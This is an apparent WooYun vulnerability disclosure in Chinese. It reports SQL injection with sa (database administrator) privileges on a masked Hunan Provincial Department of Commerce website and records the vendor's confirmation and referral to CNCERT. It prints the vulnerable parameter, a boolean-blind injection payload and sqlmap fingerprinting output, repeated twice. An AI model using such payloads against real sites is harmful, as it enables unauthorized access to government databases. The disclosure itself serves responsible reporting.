wybug_title: 湖南省商务厅某站注入一枚sa权限
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-12-25：	细节已通知厂商并且等待厂商处理中									2015-12-29：	厂商已经确认，细节仅向厂商公开									2016-01-08：	细节向核心白帽子及相关领域专家公开									2016-01-18：	细节向普通白帽子公开									2016-01-28：	细节向实习白帽子公开									2016-02-09：	细节向公众公开  简要描述： 湖南省商务厅某站注入一枚，sa权限 详细说明：  注入点：http://**.**.**.**//index.aspx?JiGouBianHao=430100
GET parameter 'JiGouBianHao' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 98 HTTP(s) requests:---Parameter: JiGouBianHao (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: JiGouBianHao=430100') AND 5240=5240 AND ('NUGO'='NUGO---[19:42:55] [INFO] testing MySQL[19:42:58] [WARNING] the back-end DBMS is not MySQL[19:42:58] [INFO] testing Oracle[19:43:00] [WARNING] the back-end DBMS is not Oracle[19:43:00] [INFO] testing PostgreSQL[19:43:03] [WARNING] the back-end DBMS is not PostgreSQL[19:43:03] [INFO] testing Microsoft SQL Server[19:43:05] [INFO] confirming Microsoft SQL Server[19:43:16] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008






   漏洞证明：  
GET parameter 'JiGouBianHao' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 98 HTTP(s) requests:---Parameter: JiGouBianHao (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: JiGouBianHao=430100') AND 5240=5240 AND ('NUGO'='NUGO---[19:42:55] [INFO] testing MySQL[19:42:58] [WARNING] the back-end DBMS is not MySQL[19:42:58] [INFO] testing Oracle[19:43:00] [WARNING] the back-end DBMS is not Oracle[19:43:00] [INFO] testing PostgreSQL[19:43:03] [WARNING] the back-end DBMS is not PostgreSQL[19:43:03] [INFO] testing Microsoft SQL Server[19:43:05] [INFO] confirming Microsoft SQL Server[19:43:16] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008






   修复方案：  你们更专业。   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-29 17:42 厂商回复： CNVD确认所述漏洞情况，已经转由CNCERT下发湖南分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
